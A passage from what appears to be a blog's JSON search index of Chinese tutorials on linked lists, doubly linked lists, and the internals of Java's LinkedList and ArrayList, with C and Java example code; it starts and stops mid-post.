的那个人出列；他的下一个人又从 1 开始，还是顺时针开始报数，数到 m 的那个人又出列；依次重复下去，直到圆桌上剩余一个人。 如图 2 所示，假设此时圆周周围有 5 个人，要求从编号为 3 的人开始顺时针数数，数到 2 的那个人出列： 出列顺序依次为： 编号为 3 的人开始数 1，然后 4 数 2，所以 4 先出列； 4 出列后，从 5 开始数 1，1 数 2，所以 1 出列； 1 出列后，从 2 开始数 1，3 数 2，所以 3 出列； 3 出列后，从 5 开始数 1，2 数 2，所以 2 出列； 最后只剩下 5 自己，所以 5 胜出。 Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】双向链表(Doubly Linked List)","date":"2019-05-16T04:40:07.000Z","path":"2019/05/16/【Data-Structure】链表-双向链表/","text":"双向链表（Doubly Linked List）从名字上理解双向链表（Doubly Linked List），即链表是 “双向” 的，如下图所示： 双向，指的是各节点之间的逻辑关系是双向的，但通常头指针只设置一个，除非实际情况需要。 双向链表中各节点包含以下 3 部分信息（如下图所示）： 指针域：用于指向当前节点的直接前驱节点； 数据域：用于存储数据元素。 指针域：用于指向当前节点的直接后继节点； 因此，双链表的节点结构用 C 语言实现为： 12345typedef struct line&#123; struct line * prior; //指向直接前趋 int data; struct line * next; //指向直接后继&#125;line; 双向链表的创建同单链表相比，双链表仅是各节点多了一个用于指向直接前驱的指针域。因此，我们可以在单链表的基础轻松实现对双链表的创建。 需要注意的是，与单链表不同，双链表创建过程中，每创建一个新节点，都要与其前驱节点建立两次联系，分别是： 将新节点的 prior 指针指向直接前驱节点； 将直接前驱节点的 next 指针指向新节点； 这里给出创建双向链表的 C 语言实现代码： 12345678910111213141516171819line* initLine(line * head)&#123; head=(line*)malloc(sizeof(line));//创建链表第一个结点（首元结点） head-&gt;prior=NULL; head-&gt;next=NULL; head-&gt;data=1; line * list=head; for (int i=2; i&lt;=3; i++) &#123; //创建并初始化一个新结点 line * body=(line*)malloc(sizeof(line)); body-&gt;prior=NULL; body-&gt;next=NULL; body-&gt;data=i; list-&gt;next=body;//直接前趋结点的next指针指向新结点 body-&gt;prior=list;//新结点指向直接前趋结点 list=list-&gt;next; &#125; return head;&#125; Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Java】集合类 - LinkedList","date":"2019-05-16T03:25:05.000Z","path":"2019/05/16/【Java】集合类-LinkedList/","text":"LinkedListLinkedList 和 ArrayList 一样，都实现了 List 接口，但其内部的数据结构有本质的不同。LinkedList 是基于链表实现的（通过名字也能区分开来），所以它的插入和删除操作比 ArrayList 更加高效。但也是由于其为基于链表的，所以随机访问的效率要比 ArrayList 差。 看一下 LinkedList 的类的定义： 1234public class LinkedList&lt;E&gt; extends AbstractSequentialList&lt;E&gt; implements List&lt;E&gt;, Deque&lt;E&gt;, Cloneable, java.io.Serializable&#123;&#125; LinkedList 继承自 AbstractSequenceList，实现了 List、Deque、Cloneable、java.io.Serializable 接口。AbstractSequenceList 提供了List接口骨干性的实现以减少实现 List 接口的复杂度，Deque 接口定义了双端队列的操作。 在 LinkedList 中除了本身自己的方法外，还提供了一些可以使其作为栈、队列或者双端队列的方法。这些方法可能彼此之间只是名字不同，以使得这些名字在特定的环境中显得更加合适。 成员变量LinkedList 是基于链表结构实现，所以在类中包含了 first 和 last 两个指针(Node)。Node 中包含了上一个节点和下一个节点的引用，这样就构成了双向的链表。每个 Node 只能知道自己的前一个节点和后一个节点。 123transient int size = 0;transient Node&lt;E&gt; first; //链表的头指针transient Node&lt;E&gt; last; //尾指针 如果双端链表为空，则first和last都必须为null 如果链表不为空，那么first的前驱节点一定是null，first的item一定不为null，同理，last的后继节点一定是null，last的item一定不为null。 存储对象的结构 Node - LinkedList的内部类LinkedList类中有一个内部私有类Node，这个类就代表双端链表的节点Node。这个类有三个属性，分别是前驱节点，本节点的值，后继结点。 1234567891011private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; Node&lt;E&gt; prev; Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123; this.item = element; this.next = next; this.prev = prev; &#125;&#125; 双端链表由Node对象组成，每个节点有两个reference指向前驱节点和后继结点，第一个节点的前驱节点为null，最后一个节点的后继节点为null。 构造方法构造方法1：构造一个空的LinkedList链表结构 1public LinkedList() &#123; &#125; 构造方法2：构造一个包含指定元素的collection集合中元素的LinkedList 12345public LinkedList(Collection&lt;? extends E&gt; c) &#123; this(); //使用addAll方法，实际上就是使用遍历c并且采用头插法进行双向链表插入值。 addAll(c); &#125; 操作增加元素add(E e)该方法是在链表的末端添加一个元素，该方法内部调用了自己的方法 linkLast(E e)。 该方法首先实例化了一个与待增加元素对应的 Node对象，并将当前链表中的最后一个元素，作为这个新实例的Node对象的前驱节点； 并把这个待增加元素对应的 Node对象，作为链表的尾元素； 如果在添加这个元素进入链表之前，链表中没有任何元素，则这个待增加元素也作为链表的头元素；否则，将这个待增加元素作为在添加这个元素进入链表之前链表中最后一个元素的后继结点。 12345678910111213141516public boolean add(E e) &#123; linkLast(e); return true;&#125;void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125; addFirst(E e) 和 addLast(E e)1234567public void addFirst(E e) &#123; linkFirst(e);&#125;public void addLast(E e) &#123; linkLast(e);&#125; 从源码中也可以看出，addfirst和addLast这两个方法内部就是直接调用了linkFirst和LinkLast。 linkBefore(E e, Node succ) 下面我们看一个linkBefore方法,从名字可以看出这个方法是在给定的节点前插入一个节点，可以说是linkFirst和linkLast方法的通用版。 123456789101112void linkBefore(E e, Node&lt;E&gt; succ) &#123; // assert succ != null; final Node&lt;E&gt; pred = succ.prev; final Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, succ); succ.prev = newNode; if (pred == null) first = newNode; else pred.next = newNode; size++; modCount++;&#125; add(int index, E element)该方法是在指定 index 位置插入元素。如果 index 位置正好等于 size，则调用 linkLast(element) 将其插入末尾；否则调用 linkBefore(element, node(index))方法进行插入。 123456789101112131415161718192021public void add(int index, E element) &#123; checkPositionIndex(index); if (index == size) linkLast(element); else linkBefore(element, node(index));&#125;void linkBefore(E e, Node&lt;E&gt; succ) &#123; // assert succ != null; final Node&lt;E&gt; pred = succ.prev; final Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, succ); succ.prev = newNode; if (pred == null) first = newNode; else pred.next = newNode; size++; modCount++;&#125; LinkedList 的方法实在是太多，在这没法一一举例分析。但很多方法其实都只是在调用别的方法而已，所以建议大家将其几个最核心的添加的方法搞懂就可以了，比如 linkBefore、linkLast。其本质也就是链表之间的删除添加等。 删除节点LinkedList中提供了两个方法删除节点，源码如下所示： 123456789101112131415161718192021222324252627282930//方法1.删除指定索引上的节点public E remove(int index) &#123; //检查索引是否正确 checkElementIndex(index); //这里分为两步，第一通过索引定位到节点，第二删除节点 return unlink(node(index));&#125;//方法2.删除指定值的节点public boolean remove(Object o) &#123; //判断删除的元素是否为null if (o == null) &#123; //若是null遍历删除 for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (x.item == null) &#123; unlink(x); return true; &#125; &#125; &#125; else &#123; //若不是遍历删除 for (Node&lt;E&gt; x = first; x != null; x = x.next) &#123; if (o.equals(x.item)) &#123; unlink(x); return true; &#125; &#125; &#125; return false;&#125; 通过源码可以看出两个方法都是通过unlink()删除。 Node node(int index) 方法值得一提的是，在 remove(int index) 方法中，调用了 Node&lt;E&gt; node(int index) 方法。 123456789101112131415Node&lt;E&gt; node(int index) &#123; // assert isElementIndex(index); if (index &lt; (size &gt;&gt; 1)) &#123; Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123; Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125;&#125; 该方法的作用就是根据下标找到对应的节点， 首先确定index的位置，是靠近first还是靠近last 若靠近first则从头开始查询，否则从尾部开始查询，可以看出这样做更好的利用了LinkedList双向链表的特征 注意，这里用到了移位运算符（&gt;&gt;），这里的 size &gt;&gt; 1 等价于 size / 2。 unlink(Node x) 方法下面是 unlink(Node x) 方法的源码，这个方法是删除节点最核心的方法。 123456789101112131415161718192021222324252627E unlink(Node&lt;E&gt; x) &#123; // assert x != null; final E element = x.item; final Node&lt;E&gt; next = x.next; final Node&lt;E&gt; prev = x.prev; // 当前删除元素为头节点 if (prev == null) &#123; first = next; &#125; else &#123; prev.next = next; x.prev = null; &#125; // 当前删除元素为尾节点 if (next == null) &#123; last = prev; &#125; else &#123; next.prev = prev; x.next = null; &#125; x.item = null; size--; modCount++; return element;&#125; 获取到需要删除元素当前的值，指向它前一个节点的引用，以及指向它后一个节点的引用； 判断当前要删除的节点是否为链表的第一个节点，若是则first向后移动，若不是则将当前节点的前一个节点next指向当前节点的后一个节点； 判断当前要删除的节点是否为链表的最后一个节点，若是则last向前移动，若不是则将当前节点的后一个节点的prev指向当前节点的前一个节点； 将当前节点的值置为null size减少并返回删除节点的值 实战我们可以将LinkedList作为（单端）队列、双端队列或者栈来使用。下面我们分别进行讨论。 LinkedList作为（单端）队列Queue是一个队列接口，而LinkedList类实现了Queue接口。 1234567Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();queue.add(1);queue.add(2);while (!queue.isEmpty()) &#123; Integer integer = queue.poll(); System.out.printf(&quot;%d &quot;, integer);&#125; LinkedList作为双端队列Deque是一个双端队列接口，而LinkedList类实现了Deque接口。 1234567891011121314151617181920Deque&lt;Integer&gt; deque = new LinkedList&lt;&gt;();// 获取第一个元素deque.getFirst();// 获取最后一个元素deque.getLast();// 获取并移除第一个元素deque.pollFirst();// 获取并移除最后一个元素deque.pollLast();// 插入元素到头部deque.addFirst(1);// 插入元素到队尾deque.addLast(2);while (!deque.isEmpty()) &#123; Integer integer = deque.pollFirst(); System.out.printf(\"%d \", integer);&#125; LinkedList作为栈1234567LinkedList&lt;Integer&gt; stack = new LinkedList&lt;&gt;();// 获取栈顶元素stack.peek();// 栈顶元素出栈stack.pop();s// 栈顶元素入栈stack.push(2); Reference 《Data Structure And Algorithm Analysis in Java》 LinkedList 的实现原理 - http://wiki.jikexueyuan.com/project/java-collection/linkedlist.html LinkedList实现原理分析（Java源码剖析） - https://www.jianshu.com/p/56c77c517e71 JAVA学习-LinkedList详解 - https://www.jianshu.com/p/732b5294a985","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Data Structure】链表(Linked List)","date":"2019-05-16T02:08:09.000Z","path":"2019/05/16/【Data-Structure】链表-链表/","text":"链表（Linked List）链表（Linked List），别名链式存储结构或单链表，用于存储逻辑关系为 “一对一” 的数据。与顺序表不同，链表不限制数据的物理存储状态，换句话说，使用链表存储的数据元素，其物理存储位置是随机的。 例如，使用链表存储 {1,2,3}，数据的物理存储状态如下图所示： 我们看到，上图根本无法体现出各数据之间的逻辑关系。对此，链表的解决方案是，每个数据元素在存储时都配备一个指针，用于指向自己的直接后继元素。如下图所示： 像上图这样，数据元素随机存储，并通过指针表示数据之间逻辑关系的存储结构就是链式存储结构。 也就是说：链表具有动态的能力，不需要去处理固定容量的问题 正因为链表具备这种动态能力，那它也就缺失了高效的random access（随机访问）的能力。它无法与数组一样，通过一个索引（index）直接获取对应的元素。 因为在底层机制中数组开辟的空间在内存中是连续分布的，我们可以直接寻找索引对应的偏移，直接计算出数据所存储的内存地址，直接用O(1)复杂度拿出。 链表靠next连接，每个节点存储地址不同，我们只能通过next顺藤摸瓜找到我们要找的元素。 链表的节点链表中每个数据的存储都由以下两部分组成： 数据元素本身，其所在的区域称为数据域（data field）； 指向直接后继元素的指针，所在的区域称为指针域（pointer field）； 即链表中存储各数据元素的结构如下图所示： 上图所示的结构在链表中称为节点。也就是说，链表实际存储的是一个一个的节点，真正的数据元素包含在这些节点中，如下图所示： 因此，链表中每个节点的具体实现，需要使用 C 语言中的结构体，具体实现代码为： 1234typedef struct Link&#123; char elem; //代表数据域 struct Link * next; //代表指针域，指向直接后继元素&#125;link; //link为节点名，每个节点都是一个 link 结构体 提示，由于指针域中的指针要指向的也是一个节点，因此要声明为 Link 类型。 头节点，头指针和首元节点其实，上图所示的链表结构并不完整。一个完整的链表需要由以下几部分构成： 头指针：一个普通的指针，它的特点是永远指向链表第一个节点的位置。很明显，头指针用于指明链表的位置，便于后期找到链表并使用表中的数据； 节点：链表中的节点又细分为头节点、首元节点和其他节点： 头节点：其实就是一个不存任何数据的空节点，通常作为链表的第一个节点。对于链表来说，头节点不是必须的，它的作用只是为了方便解决某些实际问题； 首元节点：由于头节点（也就是空节点）的缘故，链表中称第一个存有数据的节点为首元节点。首元节点只是对链表中第一个存有数据节点的一个称谓，没有实际意义； 其他节点：链表中其他的节点； 因此，一个存储 {1,2,3} 的完整链表结构如下图所示： 注意：链表中有头节点时，头指针指向头节点；反之，若链表中没有头节点，则头指针指向首元节点。 性能 接口 说明 时间复杂度 add(index, e) 插入操作 O(n) remove(index, e) 删除操作 O(n) set(index, e) 修改操作 O(n) get(index, e) 查找操作 O(n) contains(index, e) 也是查找操作 O(n) 正因为链表没有索引，因此链表丧失了像数组那样快速访问的能力，这也就让链表的增删改查全都是O(n)级别的。 分析由于链表不需要像数组一下子必须new出来一片空间，因而需要多少个数据，就生成多少个节点挂接起来，最终不存在空间浪费的问题。换句话说，链表具有动态的能力，不需要去处理固定容量的问题。 正因为链表具备这种动态能力，那它也就缺失了高效的random access（随机访问）的能力。它无法与数组一样，通过一个索引（index）直接获取对应的元素。 因为从底层实现来说，数组开辟的空间在内存中是连续分布的，因此我们就可以计算出该索引对应的偏移量（offset），进而计算出数据所存储的内存地址，直接用O(1)复杂度拿出。 而链表靠next连接，每个节点的存储地址不同，因此我们只能通过 next 域不断“顺藤摸瓜”找到我们要找的元素。 从上表的时间复杂度来看，这似乎说明链表是一个性能不太优的数据结构，我们来对链表的接口进行一些调整，然后在看一下 时间复杂度 。 接口 说明 复杂度 addFirst(index, e) 插入表头操作 O(1) addLase(index, e) 插入链尾操作 O(1) removeFirst(index, e) 删除表头操作 O(1) removeLast(index, e) 删除链尾操作 O(1) getFirst(index, e) 查找链表头操作 O(1) 经过添加这些接口，链表的在使用时复杂度就变成了O(1)。 链表的创建（初始化）我们只需在主函数中调用 initLink 函数，即可轻松创建一个存储 {1,2,3,4} 的链表，C 语言完整代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;//链表中节点的结构typedef struct Link&#123; int elem; struct Link *next;&#125;link;//初始化链表的函数link * initLink();//用于输出链表的函数void display(link *p);int main() &#123; //初始化链表（1，2，3，4） printf(\"初始化链表为：\\n\"); link *p=initLink(); display(p); return 0;&#125;link * initLink()&#123; link * p=NULL;//创建头指针 link * temp = (link*)malloc(sizeof(link));//创建首元节点 //首元节点先初始化 temp-&gt;elem = 1; temp-&gt;next = NULL; p = temp;//头指针指向首元节点 for (int i=2; i&lt;5; i++) &#123; link *a=(link*)malloc(sizeof(link)); a-&gt;elem=i; a-&gt;next=NULL; temp-&gt;next=a; temp=temp-&gt;next; &#125; return p;&#125;void display(link *p)&#123; link* temp=p;//将temp指针重新指向头结点 //只要temp指针指向的结点的next不是Null，就执行输出语句。 while (temp) &#123; printf(\"%d \",temp-&gt;elem); temp=temp-&gt;next; &#125; printf(\"\\n\");&#125; 程序运行结果为： 12初始化链表为：1 2 3 4 链表的基本操作本节将详细介绍对链表的一些基本操作，包括对链表中数据的添加、删除、查找（遍历）和更改。 注意，以下对链表的操作实现均建立在已创建好链表的基础上，创建链表的代码如下所示： 123456789101112131415161718192021//声明节点结构typedef struct Link&#123; int elem;//存储整形元素 struct Link *next;//指向直接后继元素的指针&#125;link;//创建链表的函数link * initLink()&#123; link * p=(link*)malloc(sizeof(link));//创建一个头结点 link * temp=p;//声明一个指针指向头结点，用于遍历链表 //生成链表 for (int i=1; i&lt;5; i++) &#123; //创建节点并初始化 link *a=(link*)malloc(sizeof(link)); a-&gt;elem=i; a-&gt;next=NULL; //建立新节点与直接前驱节点的逻辑关系 temp-&gt;next=a; temp=temp-&gt;next; &#125; return p;&#125; 从实现代码中可以看到，该链表是一个具有头节点的链表。由于头节点本身不用于存储数据，因此在实现对链表中数据的”增删查改”时要引起注意。 链表插入元素同顺序表一样，向链表中增添元素，根据添加位置不同，可分为以下 3 种情况： 插入到链表的头部（头节点之后），作为首元节点； 插入到链表中间的某个位置； 插入到链表的最末端，作为链表中最后一个数据元素； 思想虽然新元素的插入位置不固定，但是链表插入元素的思想是固定的，只需做以下两步操作，即可将新元素插入到指定的位置： 将新结点的 next 指针指向插入位置后的结点； 将插入位置前结点的 next 指针指向插入结点； 例如，我们在链表 {1,2,3,4} 的基础上分别实现在头部、中间部位、尾部插入新元素 5，其实现过程如下图所示： 从图中可以看出，虽然新元素的插入位置不同，但实现插入操作的方法是一致的，都是先执行步骤 1 ，再执行步骤 2。 三种插入情况插入到链表的头部（头节点之后） 插入到链表中间的某个位置 插入到链表的最末端“插入到链表的最末端”的情况其实和“插入到链表中间的某个位置”的相同的，唯一有一个微小的不同是 pre.next 为 null，而 pre.next 为 null并不影响将 pre.next 赋值给 node.next 操作（只不过 node.next 最终值为 null 罢了）。 虚拟的头结点（Dummy）值得注意的是，在前面总结的向链表插入元素的步骤 2 中（将插入位置前结点的 next 指针指向插入结点）。这意味着，要向索引为 i 的位置（头部元素索引为 0）插入一个元素，我们需要先找到索引为 i-1的节点。问题就来了，如果希望在索引为0的位置（也就是链表的头部位置）插入一个元素，我们就需要先找到索引为 -1 的节点，显然这个节点是不存在的。 因此，处理链表的插入头部和插入中间的操作的代码逻辑是不一样的，那能否用同样的代码来覆盖这两种情况呢？ 答案是肯定的！既然头部元素没有前驱元素，那我们就给它一个号了，因此只需要引入虚拟的头结点的概念就行了。 链表删除元素从链表中删除指定数据元素时，实则就是将存有该数据元素的节点从链表中摘除，但作为一名合格的程序员，要对存储空间负责，对不再利用的存储空间要及时释放。因此，从链表中删除数据元素需要进行以下 2 步操作： 找到待删除元素的前驱节点 将待删除元素的 next 域赋值给该前驱节点的 next 域 这相当于进行下面的操作： 1temp-&gt;next = temp-&gt;next-&gt;next; 例如，从存有 {1,2,3,4} 的链表中删除元素 3，则此代码的执行效果如下图所示： 动画： 链表查找元素在链表中查找指定数据元素，最常用的方法是：从表头依次遍历表中节点，用被查找元素与各节点数据域中存储的数据元素进行比对，直至比对成功或遍历至链表最末端的 NULL ，（比对失败的标志）。 因此，链表中查找特定数据元素的 C 语言实现代码为： 12345678910111213141516//p为原链表，elem表示被查找元素、int selectElem(link * p,int elem)&#123;//新建一个指针t，初始化为头指针 p link * t=p; int i=1; //由于头节点的存在，因此while中的判断为t-&gt;next while (t-&gt;next) &#123; t=t-&gt;next; if (t-&gt;elem==elem) &#123; return i; &#125; i++; &#125; //程序执行至此处，表示查找失败 return -1;&#125; 注意，遍历有头节点的链表时，需避免头节点对测试数据的影响，因此在遍历链表时，建立使用上面代码中的遍历方法，直接越过头节点对链表进行有效遍历。 动画： 链表更新元素更新链表中的元素，只需通过遍历找到存储此元素的节点，对节点中的数据域做更改操作即可。 直接给出链表中更新数据元素的 C 语言实现代码： 1234567891011//更新函数，其中，add 表示更改结点在链表中的位置，newElem 为新的数据域的值link *amendElem(link * p,int add,int newElem)&#123; link * temp=p; temp=temp-&gt;next;//在遍历之前，temp指向首元结点 //遍历到被删除结点 for (int i=1; i&lt;add; i++) &#123; temp=temp-&gt;next; &#125; temp-&gt;elem=newElem; return p;&#125; 通过链表实现不同数据结构链表实现栈 链表实现队列根据队列的性质，对于队列的操作势必会影响到链表的两端，根据链表的时间复杂度分析，我们可以知道对队头操作的时间复杂度为O(1)，而对队尾操作的时间复杂度为O(n)。为什么在链表中链表头的操作会简单为O(1) 呢，根据上图可以看出，因为有了一个标识位 head ，因此可以很快的定位的表头，同样的我们可以设置一个tail变量，这样对于两端插入元素都是很容易。 这样队列从head端删除元素，从tail端插入元素。 head 队首负责出队，tail队尾负责入队。 Reference 数据结构概述 - http://data.biancheng.net/intro/ 在数据结构中穿针引线：链表（一）- https://cxyxiaowu.com/articles/2019/04/04/1554344901784.html 在数据结构中穿针引线：链表实现栈和队列 - https://cxyxiaowu.com/articles/2019/04/04/1554344924081.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Java】集合类 - ArrayList","date":"2019-05-15T03:59:33.000Z","path":"2019/05/15/【Java】集合类-ArrayList/","text":"ArrayList介绍ArrayList是一种线性数据结构，它的底层是用数组实现的，相当于动态数组。与Java中的数组相比，它的容量能动态增长。类似于C语言中的动态申请内存，动态增长内存。 当创建一个数组的时候，就必须确定它的大小，系统会在内存中开辟一块连续的空间，用来保存数组，因此数组容量固定且无法动态改变。ArrayList在保留数组可以快速查找优势的基础上，还解决了自动扩容问题。 ArrayList特点 快速查找：在物理内存上采用顺序存储结构，因此可根据索引快速地查找元素。 容量动态增长： 如下图所示，当数组容量不够用时（表1），自动创建一个比原数组容量大的新数组（表2），并将数组中的元素复制到新数组（表3），再将新的元素也放入新数组（表4），最后将新数组赋给原数组引用即可。 ArrayList继承关系ArrayList继承于AbstractList，实现了List，RandomAccess，Cloneable，java.io.Serializable这些接口，实现了所有List接口的操作，并ArrayList允许存储null值。 除了没有进行同步，ArrayList基本等同于Vector。在Vector中几乎对所有的方法都进行了同步，但ArrayList仅对writeObject和readObject进行了同步，其它比如add(Object)、remove(int)等都没有同步。 AbstractList提供了List接口的默认实现（个别方法为抽象方法）。 List接口定义了列表必须实现的方法。 实现了RandomAccess接口：提供了随机访问功能。RandmoAccess是java中用来被List实现，为List提供快速访问功能的。在ArrayList中，我们即可以通过元素的序号快速获取元素对象；这就是快速随机访问。 实现了Cloneable接口：可以调用Object.clone方法返回该对象的浅拷贝。 实现了 java.io.Serializable 接口：可以启用其序列化功能，能通过序列化去传输。未实现此接口的类将无法使其任何状态序列化或反序列化。序列化接口没有方法或字段，仅用于标识可序列化的语义。 ArrayList的实现对于ArrayList而言，它实现List接口、底层使用数组保存所有元素。其操作基本上是对数组的操作。下面进行具体的介绍： 私有属性1234567891011121314151617// 当ArrayList的构造方法中没有显示指出ArrayList的数组长度时，类内部使用默认缺省时对象数组的容量大小，为10。private static final int DEFAULT_CAPACITY = 10；// 当ArrayList的构造方法中显示指出ArrayList的数组长度为0时，类内部将EMPTY_ELEMENTDATA 这个空对象数组赋给elemetData数组。private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;;// 当ArrayList的构造方法中没有显示指出ArrayList的数组长度时，类内部使用默认缺省时对象数组为DEFAULTCAPACITY_EMPTY_ELEMENTDATA。private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;// 保存ArrayList中数据的数组transient Object[] elementData; // ArrayList中实际数据的数量private int size;// ArrayList中的对象数组的最大数组容量为Integer.MAX_VALUE – 8。private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE – 8; 很容易理解，elementData存储ArrayList内的元素，size表示它包含的元素的数量。有个关键字需要解释：transient。 Java的serialization提供了一种持久化对象实例的机制。当持久化对象时，可能对象内部有一些特殊的成员变量，我们不想在序列化时保存它们。为了在一个特定对象的一个域上关闭serialization，可以在这个域前加上transient关键字。 构造函数ArrayList提供了三种方式的构造器，可以构造一个指定初始容量的空列表、构造一个默认初始容量为10的空列表以及构造一个包含指定collection的元素的列表，这些元素按照该collection的迭代器返回它们的顺序排列的。 123456789101112131415161718192021222324252627282930// ArrayList带容量大小的构造函数。public ArrayList(int initialCapacity) &#123; // 如果initialCapacity大于0，则创建一个大小为initialCapacity的对象数组赋给elementData。 if (initialCapacity &gt; 0) &#123; this.elementData = new Object[initialCapacity]; &#125; else if (initialCapacity == 0) &#123; //如果initialCapacity等于0，则将EMPTY_ELEMENTDATA赋给elementData。 this.elementData = EMPTY_ELEMENTDATA; &#125; else &#123; //如果initialCapacity小于0，抛出异常（非法的容量）。 throw new IllegalArgumentException(\"Illegal Capacity: \"+ initialCapacity); &#125;&#125;// ArrayList构造函数。默认容量是10。public ArrayList() &#123; this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;&#125;// 创建一个包含collection的ArrayListpublic ArrayList(Collection&lt;? extends E&gt; c) &#123; elementData = c.toArray(); if ((size = elementData.length) != 0) &#123; // c.toArray might (incorrectly) not return Object[] (see 6260652) if (elementData.getClass() != Object[].class) elementData = Arrays.copyOf(elementData, size, Object[].class); &#125; else &#123; // replace with empty array. this.elementData = EMPTY_ELEMENTDATA; &#125;&#125; 添加/插入元素ArrayList是基于数组实现的，当添加/插入元素的时候，如果数组容量足够大，则直接添加/插入该元素即可， 如果数组容量不够，以 add（E e） 为例，可以看到add(E e)中先调用了ensureCapacityInternal(size+1)方法，之后将元素赋给elementData[size]，而后size自增。 比如，当第一次添加元素时，size为0，而调用add时将elementData[0]赋值为e，size设置为1。这时，将元素的索引赋给elementData[size]，就会出现数组越界的情况。这里关键就在ensureCapacityInternal(size+1)中了。 在数组最后添加元素当调用 add(E e) 方法向数组中添加元素时，默认是添加到数组中最后一个元素的后面。 1234567// 添加元素epublic boolean add(E e) &#123; // 保证在添加元素前，数组的长度容量能满足要求，即对数组的长度容量最小要求（minCapacity）= 当前元素已占用的长度+1 ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125; 在指定位置添加元素当调用下面这个方法以在指定索引位置，向数组中添加元素时，会先查找索引位置，然后将元素添加到索引处，最后把添加前索引后面的元素追加到新元素的后面。 123456789public void add(int index, E element) &#123; rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!! System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++;&#125; 在数组最后添加多个元素12345678public boolean addAll(Collection&lt;? extends E&gt; c) &#123; Object[] a = c.toArray(); int numNew = a.length; ensureCapacityInternal(size + numNew); // Increments modCount System.arraycopy(a, 0, elementData, size, numNew); size += numNew; return numNew != 0;&#125; 调整数组容量 ensureCapacity从上面向ArrayList中添加/插入元素的代码中，我们可以看到，每当向数组中添加元素时，在内部都要调用ensureCapacityInternal(int minCapacity)，以去检查，添加元素后，元素的个数是否会超出当前数组的长度，如果超出，则先将数组进行扩容，再添加元素。 123456789101112131415161718192021222324252627282930313233private void ensureCapacityInternal(int minCapacity) &#123; ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));&#125;private static int calculateCapacity(Object[] elementData, int minCapacity) &#123; // 当集合中还没有元素时，取10(默认集合容量)和minCapacity中的最大值作为当前需要的最小集合容量 if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; return Math.max(DEFAULT_CAPACITY, minCapacity); &#125; return minCapacity;&#125;// 确定ArrarList的容量private void ensureExplicitCapacity(int minCapacity) &#123; modCount++; // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity);&#125;// 若当前容量不足以容纳当前的元素个数，设置 新的容量=“(原始容量x3)/2 + 1”private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);&#125; 从上述代码中可以看出，数组进行扩容时，会将老数组中的元素重新拷贝一份到新的数组中，每次数组容量的增长大约是其原容量的1.5倍。这种操作的代价是很高的，因此在实际使用时，我们应该尽量避免数组容量的扩张。当我们可预知要保存的元素的多少时，要在构造ArrayList实例时，就指定其容量，以避免数组扩容的发生。或者根据实际需求，通过调用ensureCapacity方法来手动增加ArrayList实例的容量。 元素修改set(int index, E element) 方法的作用是指定下标索引处的元素的值。在ArrayList的源码实现中，方法内首先判断传递的元素数组下标参数是否合法，然后将原来的值取出，设置为新的值，将旧值作为返回值返回。 12345678910public E set(int index, E element) &#123; // 检验索引是否合法 rangeCheck(index); // 旧值 E oldValue = elementData(index); // 赋新值 elementData[index] = element; // 返回旧值 return oldValue;&#125; 元素读取get(int index) 方法是返回指定下标处的元素的值。get函数会检查索引值是否合法（只检查是否大于size，而没有检查是否小于0）。如果所引致合法，则调用 elementData(int index) 方法获取值。在 elementData(int index) 方法中返回元素数组中指定下标的元素，并且对其进行了向下转型。 123456// 返回此列表中指定位置上的元素。public E get(int index) &#123; rangeCheck(index); checkForComodification(); return ArrayList.this.elementData(offset + index);&#125; 元素删除remove(int index) 方法的作用是删除指定下标的元素。在该方法的源码中，将指定下标后面一位到数组末尾的全部元素向前移动一个单位，并且把数组最后一个元素设置为null，这样方便之后将整个数组不再使用时，会被GC，可以作为小技巧。而需要移动的元素个数为：size-index-1。 123456789101112131415// 删除ArrayList指定位置的元素public E remove(int index) &#123; rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved &gt; 0) 